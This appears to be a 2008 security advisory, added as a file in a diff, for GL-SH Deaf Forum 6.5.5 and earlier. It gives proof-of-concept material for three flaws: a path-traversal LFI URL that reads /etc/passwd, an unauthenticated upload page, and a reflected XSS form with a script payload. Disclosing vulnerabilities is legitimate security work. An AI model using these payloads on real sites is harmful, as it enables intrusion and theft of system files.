@@ -1,0 +1,67 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: GL-SH Deaf Forum <=6.5.5 Multiple Vulnerabilities
+# Vendor: www.frank-karau.de
+# Vulnerable Version: 6.5.5 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/46
+###################################################################################
+
+####################
+1. Description:
+####################
+    Gl-SH Deaf board is programmed a free board in PHP, without My SQL, With 10 Designs and 5 languages.
+####################
+2. Vulnerabilities:
+####################
+    2.1. Local File Inclusion (LFI) in "/functions.php" in "FORUM_LANGUAGE" parameter.
+        2.1.1. Exploit:
+                        Check the exploit/POC section.
+    2.2. File (image) Upload without premission.
+        2.2.1. Exploit:
+                        Check the exploit/POC section.
+    2.3. Cross Site Scripting (XSS). Reflected XSS attack in "search.php".
+        2.3.1. Exploit:
+                        Check the exploit/POC section.
+
+####################
+3. Exploits/POCs:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/46/exploit
+    3.1. Local File Inclusion (LFI) in "/functions.php" in "FORUM_LANGUAGE" parameter.
+        -------------
+        LFI:
+            http://[URL]/[Forum Path]/functions.php?FORUM_LANGUAGE=/../../../../../../../../../../etc/passwd
+        -------------
+    3.2. File (image) Upload with out premission.
+        -------------
+        Uploader link:
+            http://[URL]/[Forum Path]/upload.php
+        -------------
+    3.3. Cross Site Scripting (XSS). Reflected XSS attack in "search.php".
+        -------------
+            <form action="http://[URL]/[Forum path]/search.php" method="post">
+            <tr><td class=g>XSS: <small></td><tr>
+            &quot;&lt;SCRIPT&gt;alert(/BugReport.ir-XSS/.source)&lt;/SCRIPT&gt;
+            <br><tr><td class=g><INPUT TYPE="text" class="txt" NAME="search" SIZE="30" MAXLENGTH="100"><br/>
+            <tr><td class=g><INPUT TYPE="RADIO" checked NAME="type" VALUE="themen">&nbsp;search only in topics</td></tr>
+            <tr><td class=g><INPUT TYPE="RADIO" NAME="type" VALUE="beitraege">&nbsp;search in topics and answers</td></tr>
+            <INPUT TYPE="SUBMIT" class="btn" NAME="submit" VALUE="submit"></td></tr>
+        -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized. check permission for upload page.
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-20]
